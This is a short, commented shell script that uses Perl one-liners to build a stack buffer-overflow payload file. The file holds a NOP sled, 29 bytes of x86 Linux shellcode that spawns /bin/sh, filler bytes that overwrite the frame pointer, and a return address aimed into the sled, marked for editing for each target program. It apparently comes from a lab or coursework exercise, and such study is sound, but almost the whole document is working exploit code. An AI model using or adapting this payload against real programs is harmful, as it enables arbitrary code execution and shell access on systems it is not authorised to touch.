# commands for outputting shellcode to a file "payload"
# originally done individually from the command line
# AUTHOR: Keith S.

# 35 nops used to create a 64 byte shellcode
# this is the "nop sled" used to direct code into the beginning of my shellcode. Can be adjusted to the size of any buffer desired.
perl -e 'print "\x90"x35' > payload

# 29 words (bytes)
# This command contains the actual payload that will execute /bin/sh.
perl -e 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x0b\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x52\x89\xe1\xcd\x80"' >> payload

# four bytes used to overwrite the frame pointer (just garbage values 'AAAA')
perl -e 'print "\x41\x41\x41\x41"' >> payload

# enter memory address of nop sled to allow arbitrary code execution (in this case I used 0xbffff555)
# overwrite the return address pointer, setting %eip to point into nop sled
### EDIT THIS ADDRESS FOR GIVEN PROGRAM ###
perl -e 'print "\x55\xf5\xff\xbf"' >> payload